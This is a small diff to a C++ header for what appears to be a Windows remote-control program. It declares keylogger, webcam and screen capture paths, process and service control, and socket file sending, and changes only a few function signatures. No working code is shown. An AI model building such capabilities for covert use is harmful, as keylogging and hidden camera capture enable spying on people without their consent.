@@ -32,9 +32,9 @@ extern stringstream inp, out;
 extern string webcamCapturePath, keyloggerCapturePath, screenCapturePath, requestFilePath;
 
 map<string, map<string, function<void()>>> setupHandlers();
-string getInstruction();
 string getFileName(const string& filePath);
-void listProcesses();
+void getInstruction();
+void listApps();
 void startApp(LPWSTR appPath);
 void stopApp(DWORD processID);
 void listServices();
@@ -51,6 +51,6 @@ void startCamera();
 void captureCamera();
 void stopCamera();
 void sendFile(CSocket& socket, const string& filePath);
-bool enableShutdownPrivilege();
+void enableShutdownPrivilege();
 
 #endif
